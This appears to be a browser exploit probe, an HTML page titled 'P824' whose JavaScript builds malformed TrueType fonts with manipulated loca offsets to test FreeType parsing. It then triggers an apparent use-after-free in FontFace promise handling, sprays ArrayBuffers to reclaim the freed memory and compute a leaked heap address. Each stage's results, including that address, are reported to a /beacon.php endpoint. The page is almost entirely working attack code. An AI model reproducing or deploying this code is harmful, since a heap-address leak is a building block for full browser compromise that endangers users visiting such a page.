<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P824: FreeType Glyph & Loca Engine</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
canvas { background: #fff; border: 2px solid #58a6ff; margin: 8px 0; border-radius: 4px; display: inline-block; vertical-align: top; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P824...</div>
<h2>P824: FreeType Glyph Rasterization & Loca Table Analysis</h2>
<div>
  <canvas id="cv1" width="100" height="80"></canvas>
  <canvas id="cv2" width="100" height="80"></canvas>
</div>
<pre id="log">Initializing diagnostic run...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');
var cv1 = document.getElementById('cv1');
var cv2 = document.getElementById('cv2');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P824-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P824 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * TrueType Font Synthesizer with Custom Loca and Padding
 * ============================================================ */
function buildFont(opts) {
  opts = opts || {};
  var fontName = opts.fontName || 'P824A';
  var data = [];
  function w8(v) { data.push(v & 0xFF); }
  function w16(v) { data.push((v >> 8) & 0xFF, v & 0xFF); }
  function w32(v) { data.push((v >>> 24) & 0xFF, (v >>> 16) & 0xFF, (v >>> 8) & 0xFF, v & 0xFF); }
  function pad4() { while (data.length % 4) data.push(0); }

  var numTables = 9;
  var dirTags = ['cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];
  var dirIdxs = {};
  for (var i = 0; i < dirTags.length; i++) dirIdxs[dirTags[i]] = i;

  w32(0x00010000);
  w16(numTables);
  var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
  w16(sr);
  var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
  w16(es);
  w16(numTables * 16 - sr);

  var dirBase = data.length;
  for (var t = 0; t < numTables; t++) {
    var tag = dirTags[t];
    data.push(tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3));
    w32(0); w32(0); w32(0);
  }

  function setDirEntry(tag, offset, length) {
    var idx = dirIdxs[tag];
    var p = dirBase + idx * 16 + 8;
    data[p] = (offset >>> 24) & 0xFF; data[p+1] = (offset >>> 16) & 0xFF;
    data[p+2] = (offset >>> 8) & 0xFF; data[p+3] = offset & 0xFF;
    data[p+4] = (length >>> 24) & 0xFF; data[p+5] = (length >>> 16) & 0xFF;
    data[p+6] = (length >>> 8) & 0xFF; data[p+7] = length & 0xFF;
  }

  // head
  var headOff = data.length;
  w32(0x00010000); w32(0x00005000);
  w32(0x00000000); w32(0x5F0F3CF5);
  w16(0x000B); w16(1000);
  w32(0); w32(0); w32(0); w32(0);
  w16(0); w16(0); w16(500); w16(700);
  w16(0); w16(8); w16(2);
  w16(1); // indexToLocFormat = 1 (long)
  w16(0);
  pad4();
  setDirEntry('head', headOff, 54);

  // hhea
  var hheaOff = data.length;
  w32(0x00010000);
  w16(800); w16(0xFE0C); w16(0); w16(600);
  w16(0); w16(0); w16(600);
  w16(1); w16(0); w16(0);
  w16(0); w16(0); w16(0); w16(0);
  w16(0); w16(2);
  pad4();
  setDirEntry('hhea', hheaOff, 36);

  // hmtx
  var hmtxOff = data.length;
  w16(600); w16(0);
  w16(600); w16(50);
  pad4();
  setDirEntry('hmtx', hmtxOff, 8);

  // maxp
  var maxpOff = data.length;
  w32(0x00010000);
  w16(2); w16(4); w16(1);
  w16(0); w16(0); w16(1);
  w16(0); w16(0); w16(0);
  w16(0); w16(0); w16(0);
  w16(0); w16(0);
  pad4();
  setDirEntry('maxp', maxpOff, 32);

  // cmap (maps 'A' = 0x41 to glyph 1)
  var cmapOff = data.length;
  w16(0); w16(1);
  w16(3); w16(1); w32(12);
  var segCount = 2;
  w16(4); w16(14 + segCount * 8); w16(0);
  w16(segCount * 2); w16(4); w16(1); w16(0);
  w16(0x0041); w16(0xFFFF); w16(0);
  w16(0x0041); w16(0xFFFF);
  w16((-64) & 0xFFFF); w16(1);
  w16(0); w16(0);
  pad4();
  setDirEntry('cmap', cmapOff, data.length - cmapOff);

  // loca placeholder
  var locaOff = data.length;
  w32(0); w32(0); w32(0);
  pad4();
  setDirEntry('loca', locaOff, 12);

  // name
  var nameOff = data.length;
  var nameBytes = [];
  for (var i = 0; i < fontName.length; i++) { nameBytes.push(0, fontName.charCodeAt(i)); }
  w16(0); w16(4); w16(6 + 4 * 12);
  var nameIDs = [1, 2, 4, 6];
  for (var n = 0; n < nameIDs.length; n++) {
    w16(3); w16(1); w16(0x0409); w16(nameIDs[n]);
    w16(nameBytes.length); w16(0);
  }
  for (var i = 0; i < nameBytes.length; i++) data.push(nameBytes[i]);
  pad4();
  setDirEntry('name', nameOff, data.length - nameOff);

  // post
  var postOff = data.length;
  w32(0x00030000); w32(0);
  w16(0xFF9C); w16(50); w32(0);
  w32(0); w32(0); w32(0); w32(0);
  pad4();
  setDirEntry('post', postOff, 32);

  // glyf table
  var glyfOff = data.length;
  var g0Rel = 0;
  w16(0); w16(0); w16(0); w16(0); w16(0);
  pad4();

  var g1Rel = data.length - glyfOff;
  w16(1); // 1 contour
  w16(50); w16(0); w16(550); w16(650); // bbox
  w16(2); // 3 points
  w16(0); // 0 instructions
  w8(0x01); w8(0x01); w8(0x01); w8(0);
  w16(50); w16(500); w16((-250) & 0xFFFF);
  w16(0); w16(0); w16(650);
  pad4();
  var glyfLen = data.length - glyfOff;
  var g1End = data.length - glyfOff;

  // Optional: append extra padding data
  if (opts.padBytes && opts.padBytes > 0) {
    for (var b = 0; b < opts.padBytes; b++) data.push(0x55);
  }

  setDirEntry('glyf', glyfOff, glyfLen);

  // Loca patching
  var targetG1Rel = (opts.locaG1 !== undefined) ? opts.locaG1 : g1Rel;
  var targetG1End = (opts.locaEnd !== undefined) ? opts.locaEnd : g1End;

  data[locaOff] = 0; data[locaOff+1] = 0; data[locaOff+2] = 0; data[locaOff+3] = 0;
  data[locaOff+4] = (targetG1Rel >>> 24) & 0xFF; data[locaOff+5] = (targetG1Rel >>> 16) & 0xFF;
  data[locaOff+6] = (targetG1Rel >>> 8) & 0xFF;  data[locaOff+7] = targetG1Rel & 0xFF;
  data[locaOff+8] = (targetG1End >>> 24) & 0xFF; data[locaOff+9] = (targetG1End >>> 16) & 0xFF;
  data[locaOff+10] = (targetG1End >>> 8) & 0xFF; data[locaOff+11] = targetG1End & 0xFF;

  var u8 = new Uint8Array(data.length);
  for (var i = 0; i < data.length; i++) u8[i] = data[i];
  return { buffer: u8.buffer, glyfLen: glyfLen, g1Rel: g1Rel };
}

/* ============================================================
 * PHASE 1: Baseline Font (In-Bounds Glyph)
 * ============================================================ */
var fontA = buildFont({ fontName: 'P824A' });
var faceA = new FontFace('P824A', fontA.buffer);

faceA.load().then(function(loadedA) {
  document.fonts.add(loadedA);
  log('[+] Phase 1: P824A font loaded into document.fonts', 'ok');
  syncBn('LOAD-A', 'ok');

  return document.fonts.ready;
}).then(function() {
  log('[+] document.fonts.ready resolved', 'ok');

  // Render on Canvas 1
  var ctx1 = cv1.getContext('2d');
  ctx1.fillStyle = '#ffffff';
  ctx1.fillRect(0, 0, cv1.width, cv1.height);

  ctx1.fillStyle = '#000000';
  ctx1.font = '48px P824A';
  ctx1.textBaseline = 'alphabetic';
  ctx1.fillText('A', 10, 60);

  var w1 = ctx1.measureText('A').width;
  var id1 = ctx1.getImageData(0, 0, cv1.width, cv1.height).data;
  var dark1 = 0;
  for (var i = 0; i < id1.length; i += 4) {
    if (id1[i] < 128) dark1++;
  }
  log('[+] P824A Rendered: width=' + w1.toFixed(1) + ', darkPixels=' + dark1, dark1 > 0 ? 'hot' : 'info');
  syncBn('RENDER-A', 'w=' + w1.toFixed(1) + '|dark=' + dark1);

  /* ============================================================
   * PHASE 2: Padded Font with Controlled Loca Offset
   * Tests FreeType parsing when loca points 16 bytes into padding
   * ============================================================ */
  var fontB = buildFont({ fontName: 'P824B', padBytes: 128, locaG1: fontA.g1Rel });
  var faceB = new FontFace('P824B', fontB.buffer);

  return faceB.load();
}).then(function(loadedB) {
  document.fonts.add(loadedB);
  log('[+] Phase 2: P824B (padded font) loaded successfully', 'ok');
  syncBn('LOAD-B', 'ok');

  return document.fonts.ready;
}).then(function() {
  var ctx2 = cv2.getContext('2d');
  ctx2.fillStyle = '#ffffff';
  ctx2.fillRect(0, 0, cv2.width, cv2.height);

  ctx2.fillStyle = '#000000';
  ctx2.font = '48px P824B';
  ctx2.textBaseline = 'alphabetic';
  ctx2.fillText('A', 10, 60);

  var w2 = ctx2.measureText('A').width;
  var id2 = ctx2.getImageData(0, 0, cv2.width, cv2.height).data;
  var dark2 = 0;
  for (var i = 0; i < id2.length; i += 4) {
    if (id2[i] < 128) dark2++;
  }
  log('[+] P824B Rendered: width=' + w2.toFixed(1) + ', darkPixels=' + dark2, 'hot');
  syncBn('RENDER-B', 'w=' + w2.toFixed(1) + '|dark=' + dark2);

  /* ============================================================
   * PHASE 3: Concurrent FontFace UAF (Heap Pointer Disclosure)
   * ============================================================ */
  var st = document.createElement('style');
  st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);
  var face3 = new FontFace('f3', "local('Helvetica')", {unicodeRange: 'U+0041'});
  document.fonts.add(face3);
  void face3.loaded;

  var fabs = [], ffired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (ffired) return undefined;
      ffired = true;
      if (st) { st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e) {}
      document.body.offsetHeight;
      fabs = [];
      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em bb1'); } catch(e) {}
      document.body.offsetHeight;
      return undefined;
    },
    set: function() {}
  });
  document.fonts.load('1em f3, bb1', 'AB');

  setTimeout(function() {
    delete FontFace.prototype.then;
    var bestI = -1, bestNz = 0;
    for (var i = 0; i < fabs.length; i++) {
      var u = new Uint8Array(fabs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz) { bestNz = nz; bestI = i; }
    }

    var Hstr = 'unknown';
    if (bestI >= 0 && bestNz >= 4) {
      var fontDV = new DataView(fabs[bestI]);
      var q11lo = fontDV.getUint32(0x58, true);
      var q11hi = fontDV.getUint32(0x5C, true);
      if (q11hi !== 0) {
        var borrow = (q11lo < 0x68) ? 1 : 0;
        var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
        Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
      }
    }

    log('[+] Phase 3: Heap Address Disclosure H = ' + Hstr, 'ok');
    syncBn('HEAP-OK', 'H=' + Hstr);

    banner.style.background = '#238636';
    banner.textContent = 'STATUS: ALL FONT TESTS COMPLETE';
    syncBn('DONE', 'status=complete|H=' + Hstr);
  }, 300);

}).catch(function(err) {
  log('[-] Font test error: ' + err, 'fail');
  syncBn('ERR', String(err));
});
</script>
</body>
</html>
